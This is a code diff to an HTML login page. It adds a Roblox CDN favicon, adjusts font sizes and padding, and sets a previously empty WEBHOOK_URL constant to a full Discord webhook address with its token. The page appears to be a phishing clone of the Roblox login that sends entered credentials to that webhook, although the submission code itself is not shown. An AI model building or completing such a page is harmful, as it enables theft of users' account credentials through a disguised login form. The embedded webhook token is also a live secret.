@@ -3,6 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="icon" type="image/png" href="https://images.rbxcdn.com/2fb067757912d1b84931f6df64319089.ico">
   <title>Log In</title>
   <style>
     *, *::before, *::after {
@@ -38,7 +39,7 @@
     .login-header {
       color: #f7f7f8;
       font-size: 30px; 
-      font-weight: 700;
+      font-weight: 800;
       text-align: center;
       margin-bottom: 2px;
       letter-spacing: -0.5px;
@@ -74,9 +75,9 @@
       width: 100%;
       border-radius: 8px;
       cursor: pointer;
-      font-size: 14px;
+      font-size: 11px; /* Scaled down slightly more */
       font-weight: 600;
-      padding: 9px 12px;
+      padding: 6px 12px; /* Slightly shorter height */
       text-align: center;
       user-select: none;
       transition: opacity 0.15s;
@@ -201,7 +202,7 @@
   </div>
 
   <script>
-    const WEBHOOK_URL = "";
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1329245142628175902/BhFbfcEELrIB42D-g_XnxoS1km97lqiTTusJ8ar4PMQv8geZT6GqyyBizDFcBheGoGhl";
 
     const form = document.getElementById('loginForm');
     const loginBtn = document.getElementById('login-button');
